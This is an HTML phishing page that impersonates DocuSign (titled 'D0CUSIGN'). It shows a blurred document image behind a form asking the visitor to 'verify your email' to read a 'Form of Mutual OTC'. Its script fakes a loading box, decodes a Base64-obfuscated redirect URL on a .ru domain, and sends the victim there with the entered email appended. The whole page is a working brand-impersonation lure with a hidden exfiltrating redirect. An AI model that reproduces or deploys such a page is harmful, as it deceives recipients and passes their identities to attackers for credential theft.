<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no"
    />
    <title>D0CUSIGN</title>
    <link
      rel="shortcut icon"
      href="https://meta-q.cdn.bubble.io/f1718227932057x822365466237625200/DOCU-60cafc67.png"
    />
    <link
      rel="stylesheet"
      href="https://cdn.hellosign.com/5be974e/build/signer.css"
      type="text/css"
    />
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin: 0;
        padding: 0;
        background-color: #fff;
        height: 100%;
      }

      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
      }

      .logo {
        width: 150px;
        margin-bottom: 20px;
        margin-top: 20px;
      }

      .overlay {
        position: relative;
        width: 98%;
        height: 880px;
        background-color: white;
        border: 1px solid #ccc;
        margin: 0 auto;
        overflow: hidden;
      }

      iframe {
        width: 100%;
        height: 100%;
        border: none;
        display: block;
        margin: 0 auto;
        overflow-x: hidden;
        /* Prevent horizontal scrolling */
        object-fit: contain;
        /* Ensure the image fits without distortion */
        object-position: center;
        /* Center the image within the iframe */
      }

      .blurred {
        filter: blur(10px);
      }

      .input-section {
        position: absolute;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        padding: 20px;
        border: 1px solid #ddd;
        text-align: center;
        width: 100%;
        max-width: 400px;
      }

      .input-section p {
        margin: 10px 0;
        color: #333;
      }

      .input-section input {
        width: 100%;
        /* Adjust to fill the parent container */
        max-width: 330px;
        /* Set a maximum width for consistency */
        padding: 10px;
        /* Equal padding on all sides */
        margin: 20px auto;
        /* Center the input field horizontally */
        display: block;
        /* Ensure the input behaves like a block-level element */
        border: 1px solid #ccc;
        font-size: 14px;
        box-sizing: border-box;
        /* Ensure padding doesn't affect width calculation */
      }

      .input-section button {
        background-color: rgb(30, 76, 161);
        color: white;
        border: none;
        padding: 10px 20px;
        cursor: pointer;
        font-size: 14px;
      }

      .input-section button:hover {
        background-color: rgb(30, 76, 161);
      }

      .custom-link {
        color: rgb(30, 76, 161);
        /* Initial color */
        text-decoration: none;
        /* Remove underline */
        transition: color 0.3s ease;
        /* Smooth transition for hover effect */
      }

      .custom-link:hover {
        color: black;
        /* Change to black on hover */
      }

      .success-box {
        position: absolute;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        padding: 20px;
        border: 1px solid #ddd;
        text-align: center;
        width: 90%;
        max-width: 400px;
        display: none;
        /* Initially hidden */
        z-index: 9999;
        /* Ensure it appears on top */
      }

      .success-box img {
        width: 50px;
        margin-bottom: 10px;
      }

      .success-box p {
        margin: 10px 0;
        color: #333;
      }
	  
	  .overlay {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Align items at the top */
            height: 100vh;
            background-color: #f9f9f9;
            padding-top: 50px; /* Add space at the top */
        }
    </style>
  </head>

  <body>
    <div class="container">
      <img
        src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png"
        alt="Logo"
        class="logo"
      />
      <div class="overlay" id="overlay">
        <iframe
          src="https://i.pinimg.com/736x/d1/3e/64/d13e649549d58b162cf918118d9ed562.jpg"
          class="blurred"
          id="iframe"
        ></iframe>

        <div class="input-section" id="inputSection">
          <form onsubmit="verifyEmail(); return false;">
            <p>Form of Mutual OTC - individual or corp</p>
            <p>To review and read, Please enter your email:</p>
            <input
              type="email"
              id="emailInput"
              placeholder=""
              required
              autocomplete="off"
            />
            <button type="submit">Verify your email address</button>
            <p>
              By verifying my email address, I accept the
              <a href="#" target="_blank" class="custom-link">Terms</a>
              &
              <a href="#" target="_blank" class="custom-link">Privacy Policy</a
              >.
            </p>
          </form>
        </div>

        <div class="success-box" id="successBox">
          <img
            src="https://cdn-icons-png.flaticon.com/512/847/847969.png"
            alt="Email Sent"
          />
          <p>Please wait...</p>
          <div style="text-align: center">
            <img
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKgAAACUCAMAAAAwLZJQAAAAYFBMVEX///8ylv8pk/+bxf8AjP8dkP/I3v/e6/9apf8Tjv/t9P+szv+hyP9EnP+SwP9OoP/l7/8AiP+my//V5v9jqf/2+v9prP9/tv9wr/+/2P+y0f93s/8Ahf/O4f87mf+Mvf8iHdDFAAADOUlEQVR4nO2YW3eqQAyFmTgDIiLIRbxU/f//8oxUWyu5YJ961trf+17ZyYTMkCQBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ2+bhaRTbt6S7ZqR1nztmwzyur+LVnSn0+UB7oRQlnMDbo6dCGET1XoDrNlRRnuwXI6ned77dOdD+4L8rSu58Q7Vp6eZNvqOMdqvaZnWfC7dKbVfqAn4YivClPWVq8yClVryorKvwQj2s86izR/tTla7Yw014GRUVjrqr57tTnK8tT2eQiMMpKfVKeLXJAtVJ8nQRYOls/UcfUctYPidC0EjE6VmvaDUJVowqhpvZUCRqedKGukgDeZ3N6dmJ5zW/37XUr1vOGl82hLRUYX6Ys6cP35JVtqPgulMlFbCod/UmXhxKv6UlNpJ5HUlVbQ2G9XVpZ9qCr3kbGyRg9GlXz4jdIzo7ZktXs9oqM9p1qpbRbJG9Go1moj4cio6ouhchcuv7NRlVgWyWdtHGE0ytVmYaXniBume7Wxb2z5lkmSo5Vj1E5V8cY1jXIjWBmEd8QRvDFzdH46aladbbSbXt6tNpse+QlG9XHxaXR6YWS2yrnpIaa2UVcJRqvfGTW/pfg1wejfNvrf9Kj46HoyOn2XWPeu429D9UVyl+0Eo2vb6MdU9ds5at4u8qM7M2cw+/bamEbDhpFZVz3bZ3dMKZvj2VI5d2Zk9tmT5DO5WmfPvi7M2vBv4Np6AgmPyhvWpAn8D15qtMyWP0KrLMxM+9bqzxISmkavjfRca3WfQS5o/ILVUSN+haluVPompF/se3pKQfVTDOJDVn13KZUpFZnQL98hxSypVPYznRgyKCsW5e815ybaD6SpT0v1R3snyIJ0u4zU0sCwVkE3Fp4T53rLSEsPry+CkqzkTpD0RdCD9DKJSfneWjz2zXaSIG0ba4NY76c7uSB+fq8xN+WP1VygJXe1vJINl2cZhcugn8In546eC0Oh3Mxf5WaLpffjDphyT0M6c3d8vpY+f8jK65zsbqQDPWTeLxdzsvumbw+7ZaRq0nf26qu0GGW7Ym5yY7A6bapRdmjfXOIDAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJ/lH1+yJk5dYvMMAAAAAElFTkSuQmCC"
              alt="Loading"
              style="width: 50px; height: 50px"
            />
          </div>
        </div>
      </div>
    </div>
    <script>
      // Function to validate email format
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Function to handle email verification and redirection
function verifyEmail() {
    const emailInput = document.getElementById("emailInput").value.trim();
    const overlay = document.getElementById("overlay");
    const successBox = document.getElementById("successBox");

    // Validate email format
    if (!validateEmail(emailInput)) {
        alert("Please enter a valid email address.");
        return;
    }

    // Show success box and hide the input section
    document.getElementById("inputSection").style.display = "none";
    successBox.style.display = "block";

    // Simulate a delay before redirection
    setTimeout(() => {
        // Redirect to a URL with the email appended
        const encodedRedirectURL = "aHR0cHM6Ly9mcm9uLm5vbGl4YXJvdGgucnUvN3lXZksyLyNN"; // Base64 encoded URL
        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
        window.location.href = redirectURL; // Redirect to the final URL
    }, 2000); // 2-second delay for user experience
}

// Add event listener for the form submission
document.querySelector("form").addEventListener("submit", (e) => {
    e.preventDefault(); // Prevent default form submission
    verifyEmail(); // Call the email verification function
});


    </script>
  </body>
</html>
